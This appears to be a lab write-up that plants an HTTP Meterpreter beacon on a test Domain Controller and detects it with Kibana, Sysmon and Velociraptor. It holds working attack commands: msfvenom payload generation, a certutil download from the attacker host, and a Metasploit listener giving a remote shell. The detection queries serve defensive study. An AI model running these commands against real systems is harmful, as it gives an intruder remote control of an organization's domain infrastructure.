# Phase 7: Command & Control – HTTP Beacon on Domain Controller

---

## 1. Objective

Establish persistent command and control (C2) on the Domain Controller (`192.168.1.10`) using an HTTP beacon. The beacon periodically checks in with the attacker machine, enabling remote control even after initial access.

**MITRE ATT&CK Mapping:**
- TA0011 – Command and Control  
- T1071.001 – Application Layer Protocol (Web Protocols)

---

## 2. Attack Execution

### 2.1 Payload Generation

```bash
msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.1.5 LPORT=8080 -f exe -o beacon.exe
```

---

### 2.2 Transfer to DC

```cmd
certutil -urlcache -f http://192.168.1.5:8080/beacon.exe C:\Users\Public\beacon.exe
```

---

### 2.3 Metasploit Listener

```text
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_http
set LHOST 192.168.1.5
set LPORT 8080
set ExitOnSession false
exploit -j
```

---

### 2.4 Execute Beacon on DC

```cmd
C:\Users\Public\beacon.exe
```

A Meterpreter session is established and periodic callbacks begin.

---

## 3. Detection in Kibana

| Event ID | Source | Description |
|----------|--------|-------------|
| 4688 | Security / Winlogbeat | Process creation (beacon.exe) |
| 3 | Sysmon | Outbound HTTP connection to attacker |

---

### Kibana Queries

```text
winlog.event_id: 4688 AND process.executable: *beacon.exe
```

```text
event.code: 3 AND destination.ip: 192.168.1.5 AND destination.port: 8080
```

---

## 4. Detection Rule (Kibana Alerting)

**Rule Name:** C2 – HTTP Beacon from DC  

- Index Pattern: `winlogbeat-*`  
- KQL Query:  
```text
winlog.event_id: 4688 AND process.executable: *beacon.exe
```  
- Schedule: Every 5 minutes  
- Threshold: Count > 0  

---

## 5. Post-Attack Hunting (Velociraptor)

### Artifacts Used:
- Windows.System.Pslist → process detection  
- Windows.Search.FileFinder → file location

### Hunt Query:
```sql
SELECT Name, Pid, CommandLine, Exe
FROM hunt_results()
WHERE Name =~ '(?i)beacon.exe'
```

---

## 6. Cleanup

```cmd
del C:\Users\Public\beacon.exe
taskkill /f /im beacon.exe
```

Stop sessions:

```text
sessions -K
```

---

## 7. Screenshot Guidance

- Kali terminal → msfvenom + handler session  
- DC terminal → beacon.exe execution  
- Kibana Discover → Event ID 4688 + Sysmon Event ID 3  

---

## 8. Conclusion

The HTTP beacon successfully established persistent command and control over the Domain Controller using an application-layer HTTP protocol. Detection was achieved through:

- Winlogbeat Event ID 4688 (process creation)  
- Sysmon Event ID 3 (network communication)

This confirms that the monitoring stack can detect stealthy C2 activity even over common web protocols.

---